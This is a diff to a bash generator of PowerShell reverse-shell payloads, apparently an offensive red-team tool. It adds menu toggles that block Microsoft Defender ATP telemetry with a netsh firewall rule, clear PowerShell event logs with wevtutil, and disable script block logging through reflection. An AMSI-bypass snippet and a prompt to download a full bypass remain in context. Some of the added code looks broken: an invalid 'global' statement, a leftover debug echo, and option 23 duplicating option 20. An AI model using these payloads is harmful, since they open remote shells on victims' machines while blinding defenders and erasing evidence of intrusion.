@@ -34,6 +34,12 @@ yellowprint "
 
 v.$version
 "
+
+#Setting default options for Powershell revshell 
+blockmssense=1
+clearlogs=0
+func=0
+
 if [ $usingngrok == 1 ]
 then 
   
@@ -615,7 +621,13 @@ pwsh=$(shuf -er -n21  {A..Z} {a..z} | tr -d '\n')
 placeh=$(openssl rand -hex $(shuf -i 1-11 -n1))
 space=$(shuf -er -n3  {A..Z} {a..z} | tr -d '\n')
 
-
+#Clear Powershell Eventlogs
+if [ $clearlogs == 1 ]
+        then 
+            disableLog="[Ref].Assembly.GetType('System.Management.Automation.ScriptBlock').\$$placehGetField(\"signatures\",\"NonPublic,static\").SetValue(\$null, (New-Object 'System.Collections.Generic.HashSet[string]'));\$settings = [Ref].Assembly.GetType('System.Management.Automation.Utils').\$$placehGetField('cachedGroupPolicySettings','NonPublic,Static').GetValue(\$null);\$settings['HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging'] = @{};\$settings['HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging'].Add('EnableScriptBlockLogging\', 0);Start-Job {set-alias $wevutil wevtutil;sleep -Milliseconds 1005; $wevutil cl Microsoft-Windows-PowerShell/Operational;$wevutil cl \"Windows PowerShell\"};"
+        else 
+            disableLog=";"
+        fi 
 
 #Check if Windows
 if [[ $3 == "w" ]]
@@ -624,7 +636,7 @@ then
     at="@"
     #"Mini-AMSI-bypass". Not a full bypass, but maybe just enough to get other stuff up and running. Can be commented out and changed of course 
     AMSIb="(([Ref].Assembly.GetTypes()|?{\$_-clike'*si*s'}).GetFields(2*20)|?{\$_-clike'*Ini*'}).SetValue(\$$placeh,\$true);"
-    disableLog="[Ref].Assembly.GetType('System.Management.Automation.ScriptBlock').\$$placehGetField(\"signatures\",\"NonPublic,static\").SetValue(\$null, (New-Object 'System.Collections.Generic.HashSet[string]'));\$settings = [Ref].Assembly.GetType('System.Management.Automation.Utils').\$$placehGetField('cachedGroupPolicySettings','NonPublic,Static').GetValue(\$null);\$settings['HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging'] = @{};\$settings['HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging'].Add('EnableScriptBlockLogging\', 0);Start-Job {set-alias $wevutil wevtutil;sleep -Milliseconds 1005; $wevutil cl Microsoft-Windows-PowerShell/Operational;$wevutil cl \"Windows PowerShell\"};"
+    
     echo -en "\nDo you wish to automatically download and run full AMSI bypass?"
         greenprint "[Y/n]"
         read -r -n 1 ans
@@ -679,7 +691,7 @@ fi
     esac
 
 #Block Defender ATP from phoning home
-mssense="& netsh a f a r n=\"nonsense\" d=out a=block prog=\"%programfiles%\Windows Defender Advanced Threat Protection\MsSense.exe\" e=yes"
+
 
 
 if [[ $4 == "udp" ]]
@@ -1888,6 +1900,7 @@ Choose an option [1]:  "
 
 
 submenu_powershell() {
+global clearlogs
 header
     echo -ne "
 $(blueprint 'Powershell')
@@ -1910,7 +1923,31 @@ $(greenprint '16)') Powershell UDP - Core
 $(greenprint '17)') Powershell UDP - Core URL encoded
 $(greenprint '18)') Powershell UDP - Core Double URL encoded
 $(greenprint '19)') Powershell TCP - Windows - VBA Macro
-$(greenprint '20)') Powershell UDP - Windows - VBA Macro
+$(greenprint '20)') Powershell UDP - Windows - VBA Macro \n"
+echo $clearlogs
+if [ "$mssense" == "" ]
+then 
+    echo -ne "\n$(greenprint '21)') Block Defender ATP - $(blueprint 'Off')"
+else 
+    echo -ne "\n$(greenprint '21)') Block Defender ATP - $(redprint 'On')"
+fi
+
+if [ $clearlogs == 0 ]
+then 
+    echo -ne "\n$(greenprint '22)') Clear Powershell Eventlogs - $(blueprint 'Off')"
+else 
+    echo -ne "\n$(greenprint '22)') Clear Powershell Eventlogs - $(redprint 'On')"
+    
+fi
+
+if [ $func != "" ]
+then 
+    echo -ne "\n$(greenprint '23)') Include upload/download function - $(redprint 'On')"
+else 
+    echo -ne "\n$(greenprint '23)') Include upload/download function - $(blueprint 'Off')"
+fi
+echo 
+echo -ne "
 $(magentaprint 'm)')  Go Back to Main Menu
 $(redprint '0)')  Exit
 
@@ -1975,6 +2012,30 @@ Choose an option:  "
         powershell_s "" "" "w" "" "vba"
         ;;
     20)
+        powershell_s "" "" "w" "udp" "vba"
+        ;;
+    21)
+        if [ "$mssense" == "" ]
+        then 
+            mssense="& netsh a f a r n=\"nonsense\" d=out a=block prog=\"%programfiles%\Windows Defender Advanced Threat Protection\MsSense.exe\" e=yes"
+        else 
+            mssense=""
+        fi
+        submenu_powershell
+        ;;
+    22)
+        
+        if [ $clearlogs == 0 ]
+        then 
+            echo "Enabling logs"
+            clearlogs=1
+        else 
+            echo "Disabling logs"
+            clearlogs=0
+        fi 
+        submenu_powershell
+        ;;
+    23)
         powershell_s "" "" "w" "udp" "vba"
         ;;
     m)
